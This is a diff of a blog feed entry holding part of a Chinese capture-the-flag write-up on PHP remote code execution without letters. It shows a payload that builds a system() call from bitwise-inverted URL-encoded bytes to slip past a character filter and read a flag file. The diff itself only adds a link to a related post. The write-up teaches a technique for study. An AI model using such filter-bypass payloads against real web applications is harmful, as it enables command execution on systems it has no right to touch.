@@ -305,7 +305,7 @@ post 传参: &lt;code&gt;welcome to the zjctf&lt;/code&gt; &lt;br&gt;
 &lt;p&gt;&lt;code&gt;$_&amp;#123;1&amp;#125;是\x8d,\x8d取反是r&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;此题 payload:&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system(&amp;quot;cat /flllllaaaaaaggggggg&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;&lt;strong&gt;深刻学习无字母 rce 来这里&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;深刻学习无字母 rce 来这里&lt;/strong&gt;&lt;a href=&#34;https://hq185187.github.io/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/&#34;&gt;来学无参构造 rce&lt;/a&gt;&lt;/p&gt;
 </content>
         <updated>2023-04-25T16:51:04.501Z</updated>
     </entry>
